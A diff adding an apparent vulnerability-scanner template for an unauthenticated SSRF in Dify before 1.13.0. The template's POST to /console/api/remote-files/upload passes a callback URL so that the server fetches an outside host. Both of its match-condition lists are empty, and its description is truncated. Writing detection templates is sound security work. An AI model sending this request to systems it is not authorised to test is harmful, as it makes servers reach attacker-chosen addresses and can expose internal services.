@@ -1,0 +1,24 @@
+id: dify-ssrf-remote-upload
+brief:
+    title: Dify < 1.13.0 - Unauthenticated SSRF via Remote File Upload
+    by: 0x_Akoko
+    level: high
+    about: Detected Dify prior to 1.13.0 is vulnerable to unauthenticated Server-Side Request Forgery via the /console/api/remote-files/upload endpoint. The endpoint accepted a user-controlled URL parameter a...
+    label:
+        - dify
+        - ssrf
+        - unauth
+        - ai
+    score: CVSS:8.3
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/console/api/remote-files/upload'
+      head:
+        Content-Type: application/json
+      body: '{"url":"http://{{interactsh-url}}/ssrf-test"}'
+      signs: []
